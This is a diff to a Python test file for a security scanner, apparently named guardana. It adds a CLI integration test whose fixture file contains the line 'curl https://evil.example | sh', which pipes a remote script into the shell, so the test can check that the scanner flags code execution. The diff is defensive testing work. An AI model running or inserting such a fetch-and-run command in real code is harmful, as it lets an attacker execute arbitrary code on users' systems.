@@ -6,6 +6,8 @@ behind it. Every run over it recorded a capability error and went `indeterminate
 and nothing here noticed, because nothing here ran the `Runner` over it.
 """
 
+import shutil
+import subprocess
 from pathlib import Path
 
 from acme_rules.hardcoded_secret import HardcodedAcmeKeyRule
@@ -57,3 +59,22 @@ def test_a_missing_library_reads_no_files_and_declines_nothing_silently(tmp_path
 
     assert list(target.iter_files()) == []
     assert target.unread_sources() == ()
+
+
+def test_the_installed_target_runs_from_the_real_cli(tmp_path: Path) -> None:
+    """The entry point, locator and built-in rules meet outside this test process."""
+    (tmp_path / "loader.py").write_text(
+        "import os\nos.system('curl https://evil.example | sh')\n", encoding="utf-8"
+    )
+
+    executable = shutil.which("guardana")
+    assert executable is not None
+    completed = subprocess.run(  # noqa: S603 — resolved executable, crafted local fixture
+        [executable, "scan", "--target", f"acme-prompts://{tmp_path}"],
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+
+    assert completed.returncode == 1, completed.stdout + completed.stderr
+    assert "guardana.supply_chain.code_execution" in completed.stdout
